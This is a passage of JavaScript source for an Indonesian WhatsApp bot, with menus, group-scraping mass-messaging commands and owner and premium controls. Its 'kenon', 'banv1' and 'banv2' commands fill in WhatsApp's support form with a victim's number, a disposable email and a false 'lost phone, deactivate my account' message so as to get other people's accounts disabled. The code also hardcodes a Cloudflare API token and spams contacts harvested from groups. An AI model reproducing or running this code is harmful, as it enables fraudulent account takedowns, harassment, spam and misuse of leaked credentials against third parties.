│ ∘  ${prefix}waifu
│ ∘  ${prefix}kill
│ ∘  ${prefix}pat
│ ∘  ${prefix}lick
│ ∘  ${prefix}bite
│ ∘  ${prefix}yeet
│ ∘  ${prefix}bonk
│ ∘  ${prefix}wink
│ ∘  ${prefix}poke
│ ∘  ${prefix}nom
│ ∘  ${prefix}slap
│ ∘  ${prefix}smile
│ ∘  ${prefix}wave
│ ∘  ${prefix}blush
│ ∘  ${prefix}smug
│ ∘  ${prefix}glomp
│ ∘  ${prefix}happy
│ ∘  ${prefix}dance
│ ∘  ${prefix}cringe
│ ∘  ${prefix}highfive
│ ∘  ${prefix}handhold
╰──────────────━`)
}
break

case 'beritamenu': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
loading()
await sleep(1000)
reply(`▧ 「 *B E R I T A - M E N U* 」
│ ∘  ${prefix}fajar
│ ∘  ${prefix}cnn
│ ∘  ${prefix}layarkaca
│ ∘  ${prefix}cnbc
│ ∘  ${prefix}tribun
│ ∘  ${prefix}indozone
│ ∘  ${prefix}kompas
│ ∘  ${prefix}detik
│ ∘  ${prefix}daily
│ ∘  ${prefix}inews
│ ∘  ${prefix}okezone
│ ∘  ${prefix}sindo
│ ∘  ${prefix}tempo
│ ∘  ${prefix}antara
│ ∘  ${prefix}kontan
│ ∘  ${prefix}merdeka
│ ∘  ${prefix}jalantikus-meme
╰──────────────━`)
}
break

case 'funmenu': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
loading()
await sleep(1000)
reply(`▧ 「 *F U N - M E N U* 」
│ ∘  ᴀʀᴛɪɴᴀᴍᴀ (ᴛᴇxᴛɴʏᴀ)
│ ∘  ᴀʀᴛɪᴍɪᴍᴘɪ (ᴛᴇxᴛɴʏᴀ)
│ ∘  ᴋᴇᴄᴏᴄᴏᴋᴀɴᴘᴀꜱᴀɴɢᴀɴ (ᴛᴇxᴛɴʏᴀ)
│ ∘  ᴋᴇᴄᴏᴄᴏᴋᴀɴɴᴀᴍᴀ (ᴛᴇxᴛɴʏᴀ)
│ ∘  ᴊᴀᴅɪᴀɴᴘᴇʀɴɪᴋᴀʜᴀɴ (ᴛᴇxᴛɴʏᴀ)
│ ∘  ʀᴇᴊᴇᴋɪ (ᴛᴇxᴛɴʏᴀ)
│ ∘  ꜱɪꜰᴀᴛᴜꜱᴀʜᴀ (ᴛᴇxᴛɴʏᴀ)
│ ∘  ᴘᴇᴋᴇʀᴊᴀᴀɴ (ᴛᴇxᴛɴʏᴀ)
│ ∘  ᴀʀᴛɪᴛᴀʀᴏᴛ (ᴛᴇxᴛɴʏᴀ)
│ ∘  ᴘᴏᴛᴇɴꜱɪᴘᴇɴʏᴀᴋɪᴛ (ᴛᴇxᴛɴʏᴀ)
│ ∘  ʀᴀᴍᴀʟᴀɴɴᴀꜱɪʙ (ᴛᴇxᴛɴʏᴀ)
│ ∘  ʜᴀʀɪꜱᴀɴɢᴀʀ (ᴛᴇxᴛɴʏᴀ)
│ ∘  ʜᴀʀɪʙᴀɪᴋ (ᴛᴇxᴛɴʏᴀ)
│ ∘  ꜰᴇɴɢꜱʜᴜɪ (ᴛᴇxᴛɴʏᴀ)
│ ∘  ɴᴀɢᴀʜᴀʀɪ (ᴛᴇxᴛɴʏᴀ)
│ ∘  ʜᴀʀɪɴᴀᴀꜱ (ᴛᴇxᴛɴʏᴀ)
│ ∘  ᴡᴇᴛᴏɴ (ᴛᴇxᴛɴʏᴀ)
│ ∘  ᴘᴇʀᴜɴᴛᴜɴɢᴀɴ (ᴛᴇxᴛɴʏᴀ)
│ ∘  ᴀʀᴀʜʀᴇᴊᴇᴋɪ (ᴛᴇxᴛɴʏᴀ)
│ ∘  ꜱɪꜰᴀᴛ (ᴛᴇxᴛɴʏᴀ)
│ ∘  ᴋᴇʙᴇʀᴜɴᴛᴜɴɢᴀɴ (ᴛᴇxᴛɴʏᴀ)
│ ∘  ᴍᴇᴍᴀɴᴄɪɴɢ (ᴛᴇxᴛɴʏᴀ)
│ ∘  ᴍᴀꜱᴀꜱᴜʙᴜʀ (ᴛᴇxᴛɴʏᴀ)
│ ∘  ꜱʜɪᴏ (ᴛᴇxᴛɴʏᴀ)
╰──────────────━`)
}
break

case 'gamemenu': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
loading()
await sleep(1000)
reply(`▧ 「 *G A M E - M E N U* 」
│ ∘  ᴛᴛᴄ
│ ∘  ᴅᴇʟᴛᴄ
│ ∘  ꜱᴜɪᴛᴘᴠᴘ
│ ∘  ᴛᴇʙᴀᴋ ᴋᴀᴛᴀ
│ ∘  ᴛᴇʙᴀᴋ ɢᴀᴍʙᴀʀ
│ ∘  ᴛᴇʙᴀᴋ ʟɪʀɪᴋ
│ ∘  ᴛᴇʙᴀᴋ ᴋᴀʟɪᴍᴀᴛ
│ ∘  ᴛᴇʙᴀᴋ ʟᴀɢᴜ
│ ∘  ᴛᴇʙᴀᴋ ʟᴏɴᴛᴏɴɢ
│ ∘  ꜰᴀᴍɪʟʏ100
│ ∘  ᴋᴜɪꜱᴍᴀᴛʜ ɴᴏᴏʙ
│ ∘  ᴋᴜɪꜱᴍᴀᴛʜ ᴇᴀꜱʏ
│ ∘  ᴋᴜɪꜱᴍᴀᴛʜ ᴍᴇᴅɪᴜᴍ
│ ∘  ᴋᴜɪꜱᴍᴀᴛʜ ʜᴀʀᴅ
│ ∘  ᴋᴜɪꜱᴍᴀᴛʜ ᴇxᴛʀᴇᴍᴇ
│ ∘  ᴋᴜɪꜱᴍᴀᴛʜ ɪᴍᴘᴏꜱꜱɪʙʟᴇ
│ ∘  ᴋᴜɪꜱᴍᴀᴛʜ ɪᴍᴘᴏꜱꜱɪʙʟᴇ2
╰──────────────━`)
}
break

case "hoyomenu": {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
const y14 = `▧ 「 *HOYOVERSE GUIDE* 」
│ ∘  ${prefix}enka
│ ∘  ${prefix}build / build list
╰──────────────━`
reply(y14)
}
break

case 'sc':
case 'script': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
loading()
await sleep(1000)
let buy = `▧ 「 *S C R I P T - L U M I N E V6.0* 」
│
│ ∘  *Wait...*
│
│ ∘  *Beli Di 089508082845*
│
╰──────────────━`
qyuunee.relayMessage(m.chat, {
    requestPaymentMessage: {
      currencyCodeIso4217: 'IDR',
      amount1000: 25000000,
      requestFrom: m.sender,
      noteMessage: {
      extendedTextMessage: {
      text: buy,
      contextInfo: {
      externalAdReply: {
      showAdAttribution: true
      }}}}}}, {})
      await sleep(2000)
/*qyuunee.sendMessage(m.chat, { document: fs.readFileSync("./src/SC LUMINE V4.0.zip"), mimetype: 'application/zip', fileName: 'SC LUMINE V4'}, { quoted : koi })*/
}
break

case "createqr": {
if (!isCreator) return reply('*Khusus Pemilik!*')
loading()
const qrcode = require('qrcode')
if (!text) return reply(`Penggunaan Salah Harusnya ${prefix+command} koi`)
const qyuer = await qrcode.toDataURL(text, { scale: 8 })
let data = new Buffer.from(qyuer.replace('data:image/png;base64,', ''), 'base64')
qyuunee.sendMessage(from, { image: data, caption: `Sukses Kak` }, { quoted: m })
}
break
case "detectqr": {
if (!isCreator) return reply('*Khusus Pemilik!*')
loading()
try {
mee = await qyuunee.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(mee)
const res = await fetch(`http://api.qrserver.com/v1/read-qr-code/?fileurl=${mem}`)
const data = await res.json() 
reply(util.format(data[0]))
} catch (err) {
reply(`Reply Image Yang Ada Qr Nya`)
}
}
break

case "cekidgc": {
if (!isCreator) return reply(mess.owner)
let getGroups = await qyuunee.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let teks = `⬣ *LIST GROUP DI BAWAH*\n\nTotal Group : ${anu.length} Group\n\n`
for (let x of anu) {
let metadata2 = await qyuunee.groupMetadata(x)
teks += `◉ Nama : ${metadata2.subject}\n◉ ID : ${metadata2.id}\n◉ Member : ${metadata2.participants.length}\n\n────────────────────────\n\n`
}
reply(teks + `Untuk Penggunaan Silahkan Ketik Command ${prefix}pushkontak id|teks\n\nSebelum Menggunakan Silahkan Salin Dulu Id Group Nya Di Atas`)
}
break
case "pushkontakv1":
case "pv1":{
if (!isCreator) return reply(mess.owner)
if (m.isGroup) return reply(mess.private)
if (!text) return reply(`Command Salah Seharusnya Command ${prefix+command} *idgroup|tekspushkontak*\nUntuk Liat Id Group Silahkan Ketik .cekidgc`)
global.idgcns = text.split("|")[0]
global.tekspushkon = text.split("|")[1]
const groupMetadataa = !m.isGroup? await qyuunee.groupMetadata(global.idgcns).catch(e => {}) : ""
const participants = !m.isGroup? await groupMetadataa.participants : ""
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
if (isContacts) return
for (let mem of halls) {
contacts.push(mem)
fs.writeFileSync('./database/contacts.json', JSON.stringify(contacts))
if (/image/.test(mime)) {
media = await qyuunee.downloadAndSaveMediaMessage(quoted)
memk = await uptotelegra(media)
await qyuunee.sendMessage(mem, { image: { url: memk }, caption: global.tekspushkon })
await sleep(2000)
} else {
await qyuunee.sendMessage(mem, { text: global.tekspushkon })
await sleep(2000)
}
}
qyuunee.sendMessage("6289508082845@s.whatsapp.net", {text:`🕊️ Sukses Bang...`})
}
break
case "pushkontakv2":
case "pv2":{
if (!isCreator) return reply(mess.owner)
if (!m.isGroup) return reply(mess.group)
if (!text) return reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} teks`)
global.tekspushkonv2 = text
const groupMetadata = m.isGroup? await qyuunee.groupMetadata(from).catch(e => {}) : ""
const participantts = m.isGroup? await groupMetadata.participants : ""
const halsss = await participantts.filter(v => v.id.endsWith('.net')).map(v => v.id)
if (isContacts) return
for (let men of halsss) {
contacts.push(men)
fs.writeFileSync('./database/contacts.json', JSON.stringify(contacts))
if (/image/.test(mime)) {
media = await qyuunee.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
await qyuunee.sendMessage(men, { image: { url: mem }, caption: global.tekspushkonv2 })
await sleep(3000)
} else {
await qyuunee.sendMessage(men, { text: global.tekspushkonv2 })
await sleep(3000)
}
}
qyuunee.sendMessage("6289508082845@s.whatsapp.net", {text:`🕊️ Sukses Bang...`})
}
break
case "savecontact": {
if (!isCreator) return reply(mess.owner)
reply(mess.wait)
try {
const uniqueContacts = [...new Set(contacts)];
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA [${index}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n");
return vcard; }).join("");
fs.writeFileSync("./database/contacts.vcf", vcardContent, "utf8");
} catch (err) {
reply(util.format(err))
} finally {
await qyuunee.sendMessage(from, { document: fs.readFileSync("./database/contacts.vcf"), fileName: "contacts.vcf", caption: "Nih Kak Tinggal Pencet File Di Atas Terus Save", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
fs.writeFileSync("./database/contacts.json", JSON.stringify(contacts))
}
}
break

case 'public': {
if (!isCreator) return reply(mess.owner) 
qyuunee.public = true
reply('Sukse Change To Public')
}
break

case 'self': {
if (!isCreator) return reply(mess.owner) 
qyuunee.public = false
reply('Sukses Change To Self')
}
break

case 'enc': {
            if (!isCreator) return reply(mess.owner)
            if (!q) return reply(`Contoh ${prefix+command} const adrian = require('adrian-api')`)
            let meg = await obfus(q)
            reply(`${meg.result}`)
        }
        break

case 'mediafire': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
    loading()
	if (args.length == 0) return reply(`Link Nya Tuan?`)
	if (!isUrl(args[0]) && !args[0].includes('mediafire.com')) return reply(`The link you provided is invalid`)
	const { mediafireDl } = require('./lib/mediafire.js')
	const baby1 = await mediafireDl(text)
	if (baby1[0].size.split('MB')[0] >= 50) return reply('Oops, the file is too big...')
	const result4 = `*MEDIAFIRE DOWNLOADER*

*❖ Name* : ${baby1[0].nama}
*❖ Size* : ${baby1[0].size}
*❖ Mime* : ${baby1[0].mime}
*❖ Link* : ${baby1[0].link}`
reply(`${result4}`)
qyuunee.sendMessage(m.chat, { document : { url : baby1[0].link}, fileName : baby1[0].nama, mimetype: baby1[0].mime }, { quoted : m })
}
break

/*case 'mediafire':
if (args.length == 0) return reply(`Link Nya Mana?`)
axios.get(`https://api.koi.pics/api/downloader/mediafire?url=${args[0]}&apikey=hutaowangybanget`).then(({ data }) => {
let cap = `🍂 Done...`
qyuunee.sendMessage(m.chat, { document: { url: data.data.url }, fileName: data.data.tittle, caption: cap }, { quoted : m })
})
break*/

case 'addprem':
                if (!isCreator) return reply(`Hadehh`)
                if (args.length < 2)
                    return reply(`Gini Jir ${prefix + command} @koi waktu\nAtau ${prefix + command} nomor waktu\n\nContoh : ${prefix + command} @koi 30d`)
                if (m.mentionedJid.length !== 0) {
                    for (let i = 0; i < m.mentionedJid.length; i++) {
                        addPremiumUser(m.mentionedJid[0], args[1], premium)
                    }
                    reply("🐦 Done Add User")
                } else {
                    addPremiumUser(args[0] + "@s.whatsapp.net", args[1], premium)
                    reply("🐦 Done Add User")
                }
            break
            case 'delprem':
                if (!isCreator) return reply(`Hadehh`)
                if (args.length < 1) return reply(`Gini Jir ${prefix + command} @koi\nAtau ${prefix + command} nomor`)
                if (m.mentionedJid.length !== 0) {
                    for (let i = 0; i < m.mentionedJid.length; i++) {
                        premium.splice(getPremiumPosition(m.mentionedJid[i], premium), 1)
                        fs.writeFileSync("./premium.json", JSON.stringify(premium))
                    }
                    reply("🐦 Done Delete User")
                } else {
                    premium.splice(getPremiumPosition(args[0] + "@s.whatsapp.net", premium), 1)
                    fs.writeFileSync("./premium.json", JSON.stringify(premium))
                    reply("🐦 Done Delete User")
                }
            break
            case 'listprem': {
                if (!isCreator) return reply(`Hadehh`)
                let data = require('./premium.json')
                let txt = `*×「 LIST PREMIUM 」×*\n\n`
                for (let x of data) {
                    txt += `No : ${x.id}\n`
                    txt += `Waktu : ${x.expired}\n`
                qyuunee.sendMessage(m.chat, {
                    text: txt,
                    mentions: x
                }, {
                    quoted: m
                })
                }
            }
            break

        case 'addseller':
 if (!isCreator) return reply(`Hadehh`)
        
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 0`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let cekbii = await qyuunee.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (cekbii.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
bii.push(bnnd)
fs.writeFileSync('./datakoi/db/anjay.json', JSON.stringify(bii))
reply(`Nomor ${bnnd} Sudah Bisa Akses!!!`)
break

        case 'delseller':
if (!isCreator) return reply('*Khusus Owner Bot*')
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6289508082845`)
yaki = text.split("|")[0].replace(/[^0-9]/g, '')
unp = bii.indexOf(yaki)
bii.splice(unp, 1)
fs.writeFileSync('./datakoi/db/anjay.json', JSON.stringify(bii))
reply(`Nomor ${yaki} Telah Di Hapus Dari Premium!!!`)
break

case 'listseller':
if (isBan) return reply('*Lu Di Ban Owner*')
 teksooo = '*List Seller*\n\n'
for (let i of bii) {
teksooo += `- ${i}\n`
}
teksooo += `\n*Total : ${bii.length}*`
qyuunee.sendMessage(from, { text: teksooo.trim() }, 'extendedTextMessage', { quoted:m, contextInfo: { "mentionedJid": owner } })
break

case 'ban':  {
if (!isCreator) return reply(mess.owner)
if (!args[0]) return reply(`*Contoh : ${command} add 6289508082845*`)
if (args[1]) {
orgnye = args[1] + "@s.whatsapp.net"
} else if (m.quoted) {
orgnye = m.quoted.sender
}
const isBane = banned.includes(orgnye)
if (args[0] === "add") {
if (isBane) return reply('*Pengguna Ini telah Di Ban*')
banned.push(orgnye)
reply(`Succes ban Pengguna Ini`)
} else if (args[0] === "del") {
if (!isBane) return reply('*Pengguna Ini Telah Di hapus Dari Ban*')
let delbans = banned.indexOf(orgnye)
banned.splice(delbans, 1)
reply(`*Berhasil Menghapus Pengguna yang Di Ban*`)
} else {
reply("Error")
}
}
break

case 'tes':
reply(`iya kak ${pushname}`)
break

case 'listban':
if (isBan) return reply('*Lu Di Ban Owner*')
 teksooop = `▧ 「 *L I S T - B A N* 」\n`
for (let ii of banned) {
teksooop += `   ∘  ${ii}\n`
}
reply(teksooop)
break

case 'ambilcase':
            try{
                if (!isCreator) return reply(mess.owner)
                if (!q) return reply(`Example: ${prefix + command} antilink`)
                let nana = await getCase(q)
                reply(nana)
            } catch(err){
            console.log(err)
            reply(`Case ${q} tidak di temukan`)
        }
        break 
        
case 'totalfitur':
        case 'fitur': 
            reply(`Nih Males Bet Gw Ngitung: ${totalFitur()}`)
        break
        
        case 'addowner':
if (!isCreator) return reply(mess.owner)
if (!args[0]) return reply(`Use ${prefix+command} number\nExample ${prefix+command} ${owner}`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await qyuunee.onWhatsApp(bnnd)
if (ceknye.length == 0) return reply(`Enter A Valid And Registered Number On WhatsApp!!!`)
owner.push(bnnd)
fs.writeFileSync('./owner.json', JSON.stringify(owner))
reply(`Number ${bnnd} Has Become An Owner!!!`)
break
case 'delowner':
if (!isCreator) return reply(mess.owner)
if (!args[0]) return reply(`Use ${prefix+command} nomor\nExample ${prefix+command} 6289508082845`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(ya)
owner.splice(unp, 1)
fs.writeFileSync('./owner.json', JSON.stringify(owner))
reply(`The Numbrr ${ya} Has been deleted from owner list by the owner!!!`)
break
case 'listowner': {
                let teks = '┌──⭓「 *List Owner* 」\n│\n'
                for (let x of owner) {
                    teks += `│⭔ ${x}\n`
                }
                teks += `│\n└────────────⭓\n\n*Total : ${owner.length}*`
                reply(teks)
            }
            break
            case "jadibot-scan":
          if (!isCreator) {
            return reply(mess.owner);
          }
          await jadibots(qyuunee, sender);
          break
        case "jadibot-pairing":
          if (!isCreator) {
            return reply(mess.owner);
          }
          if (!args[0]) {
            return reply("*Example*: .jadibot-pairing 6283123443245");
          }
          await jadibot(qyuunee, args[0], sender);
          await sleep(4800);
          let _0x5c377a = "*`Masukkan code dibawah ini untuk jadi bot sementara`*\n\n1. Klik titik tiga di pojok kanan atas\n2. Ketuk perangkat tertaut\n3. Ketuk tautkan perangkat\n4. Ketuk tautkan dengan nomor telepon saja\n5. Masukkan code di bawah ini\n\nNote: code dapat expired kapan saja!\n\nCode: `" + global.codepairing + "`" + "\nJika Code Error Silahkan Hapus Folder " + _0x13a702 + " di session2";
          const _0xa20bee = {
            text: _0x5c377a
          };
          const _0x43e8d6 = {
            quoted: _0x3758f4
          };
          qyuunee.sendMessage(m.sender, _0xa20bee, _0x43e8d6);
          setTimeout(async () => {
            reply("*Sukses !*");
          }, 1200);
          console.log("Jadibot •••");
          break;
            case "stop-jadibot":
          if (!isCreator) {
            return reply(mess.owner);
          }
          const _0x496bc5 = "./session2/jadibot/" + sender;
          if (!fs.existsSync(_0x496bc5)) {
            return reply("Kamu Belum Jadibot");
          }
          try {
            const _0x113dd4 = {
              recursive: true,
              force: true
            };
            fs.rmSync(_0x496bc5, _0x113dd4);
            reply("Session telah dihapus.");
          } catch (_0x455af8) {
            m.reply("Error :", _0x455af8);
          }
          break;
        case "list-jadibot":
          if (!isCreator) {
            return reply(mess.owner);
          }
          try {
            let _0x208ec0 = [...new Set([...global.conns.filter(_0x23b061 => _0x23b061.user).map(_0x47d5ed => _0x47d5ed.user)])];
            te = "*-- List Jadibot --*\n\n";
            for (let _0x137f56 of _0x208ec0) {
              y = await qyuunee.decodeJid(_0x137f56.id);
              te += " •• User : @" + y.split("@")[0] + "\n";
              te += " •• Name : " + _0x137f56.name + "\n\n";
            }
            const _0x3f9fe0 = {
              text: te,
              mentions: [y]
            };
            const _0xfae731 = {
              quoted: m
            };
            qyuunee.sendMessage(_0x3c2e1c, _0x3f9fe0, _0xfae731);
          } catch (_0x11fdea) {
            m.reply("Belum Ada User Yang Jadibot");
          }
          break;
        case "start-jadibot":
          if (!isCreator) {
            return reply(mess.owner);
          }
          try {
            await jadibot(qyuunee, args[0], m, sender);
          } catch (_0x533ccf) {
            m.reply("Belum Ada User Yang Jadibot");
          }
          break;
case 'owner': case 'crator':{
let me = m.sender
let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hai Kak @${sender.split("@")[0]}, Nih Owner Ku.. Kalo Ada Sesuatu Bilang Aja Sama Dia :3`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: "Jangan Spam Ya :3"
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image: { url: 'https://telegra.ph/file/e3abd1c56975691e12e7d.jpg' }}, { upload: qyuunee.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": `{\"display_text\":\"Koi\",\"url\":\"https://wa.me/${owner}\",\"merchant_url\":\"https://www.google.com\"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [me], 
                  forwardingScore: 999,
                  isForwarded: false
                }
        })
    }
  }
}, {})

await qyuunee.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
break

case 'domain': {
    if (!isCreator) return reply('*Khusus Owner*')
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "aad806c073e06d112b9fc2d2bc67f4b3";
               let apitoken = "2SseHIYk7KmE6z9wFsgKoXde5OpK5VzCdrtA6NyT";
               let tld = "qyuunee.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("PENGGUNAAN .domain hostname|111.111.11.1");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) reply(`✅berhasil menambah domain\nip: ${e['ip']}\nhostname: ${e['name']}`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           
case 'verif@': case 'kenon': {
if (!isCreator) return
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return reply(`Tidak bisa verif My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Perdido/roubado: desative minha conta`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19574.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007982238")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(`##- WhatsApp Support -##

Hai,

 Terima kasih atas pesan Anda.

 Kami telah menonaktifkan akun WhatsApp Anda.  Ini berarti akun Anda telah di keluarkan maka untuk sementara dinonaktifkan dan akan dihapus secara otomatis dalam 30 hari jika Anda tidak mendaftarkan ulang akun tersebut.  Harap dicatat: Tim Dukungan Pelanggan WhatsApp tidak dapat menghapus akun Anda secara manual.

 Selama periode penonaktifan:

 • Kontak Anda di WhatsApp mungkin masih melihat nama dan gambar profil Anda.
 • Setiap pesan yang mungkin dikirim oleh kontak Anda ke

 akun akan tetap dalam status tertunda hingga 30 hari.

 Jika Anda ingin mendapatkan kembali akun Anda, daftarkan ulang akun Anda sebagai

 secepatnya.  Daftar ulang akun Anda dengan memasukkan 6 digit

 kode yang Anda terima melalui SMS atau panggilan telepon.  Jika Anda mendaftar ulang

 pulihkan riwayat obrolan Anda di: Android |  iPhone.

 file, cadangan, atau riwayat panggilan dari akun yang dihapus.

 akun sebelum dihapus, Anda akan tetap berada di semua obrolan grup.  Anda akan memiliki opsi untuk memulihkan data Anda.  Pelajari caranya Jika Anda tidak mendaftarkan ulang akun Anda, akun tersebut mungkin akan dihapus dan proses ini tidak dapat dibatalkan.  Sayangnya, WhatsApp tidak dapat membantu Anda memulihkan obrolan, dokumen, media

 Catatan: Jika perangkat Anda hilang atau dicuri, sebaiknya hubungi penyedia seluler Anda untuk memblokir kartu SIM Anda sesegera mungkin.  Memblokir kartu SIM Anda mencegah orang lain mendaftar dan mengakses akun yang terkait dengan kartu SIM.

 Sumber daya terkait:

 ⚫ Untuk informasi lebih lanjut tentang penonaktifan akun pada ponsel yang hilang dan dicuri, silakan baca artikel ini.

 ⚫ Pelajari tentang akun yang dicuri di artikel ini.

 Jika Anda memiliki pertanyaan atau masalah lain, jangan ragu untuk menghubungi kami.  Kami akan dengan senang hati membantu!`)
} else if (payload.includes(`"payload":false`)) {
reply(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else reply('Masukkan nomor target!')
}
break

case 'banv1': {
if (!isPremium) return reply(mess.prem)
if (!args[0]) return reply(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
let koisplit = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let koiuy = await qyuunee.onWhatsApp(koisplit)
if (koiuy.length == 0) return reply(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let koiax = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = koiax.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(koiax.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", koisplit)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Hello, please deactivate this number, because I have lost my cellphone and someone is using my number, please deactivate my number")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
qyuunee.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case 'banv2': {
if (!isPremium) return reply(mess.prem)
if (!args[0]) return reply(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
let koisplit = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let koiuy = await qyuunee.onWhatsApp(koisplit)
if (koiuy.length == 0) return reply(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let koiax = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = koiax.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(koiax.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
